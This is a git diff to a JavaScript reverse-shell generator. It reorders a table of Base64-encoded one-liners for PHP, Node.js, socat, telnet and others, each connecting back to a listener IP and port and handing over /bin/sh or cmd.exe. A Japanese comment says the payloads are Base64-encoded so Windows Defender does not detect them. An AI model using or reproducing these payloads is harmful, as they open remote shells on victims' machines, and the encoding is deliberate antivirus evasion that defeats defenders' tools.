@@ -104,7 +104,8 @@ function drawRevShellList(lhost, lport) {
   }
 }
 
-// ローカル開発時にWindows Definderに検知されないようにBase64で保存すること
+// ローカル開発時にWindows Definderに検知されないようにBase64で保存すること。
+// {0}はIPアドレス、{1}はポート番号に置換される。
 
 reverseShells = {
 
@@ -140,6 +141,10 @@ reverseShells = {
     "cGhwIC1yICckcz1mc29ja29wZW4oIjEwLjAuMC4xIix7MX0pO3N5c3RlbSgiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn",
     "cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtwb3BlbigiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiLCAiciIpOyc=",
     "cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjAuMC4xIix7MX0pOyAkcHJvYyA9IHByb2Nfb3BlbigiL2Jpbi9zaCAtaSIsIGFycmF5KDA9PiRzb2NrLCAxPT4kc29jaywgMj0+JHNvY2spLCAkcGlwZXMpOyc=",
+  ],
+
+  "Node.js": [
+    'KGZ1bmN0aW9uKCl7e3ZhciBuZXQ9cmVxdWlyZSgibmV0IiksY3A9cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoPWNwLnNwYXduKCIvYmluL3NoIixbXSk7dmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KHsxfSwiezB9IixmdW5jdGlvbigpe3tjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO319KTtyZXR1cm4gL2EvO319KSgpOw=='
   ],
 
   "Ruby": [
@@ -188,10 +193,6 @@ reverseShells = {
   ],
   "socat (Windows)": [
     "c29jYXQuZXhlIC1kIC1kIFRDUDQ6ezB9OnsxfSBFWEVDOidjbWQuZXhlJyxwaXBlcw=="
-  ],
-
-  "Node.js": [
-    'KGZ1bmN0aW9uKCl7e3ZhciBuZXQ9cmVxdWlyZSgibmV0IiksY3A9cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoPWNwLnNwYXduKCIvYmluL3NoIixbXSk7dmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KHsxfSwiezB9IixmdW5jdGlvbigpe3tjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO319KTtyZXR1cm4gL2EvO319KSgpOw=='
   ],
 
   "telnet": ['cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w']
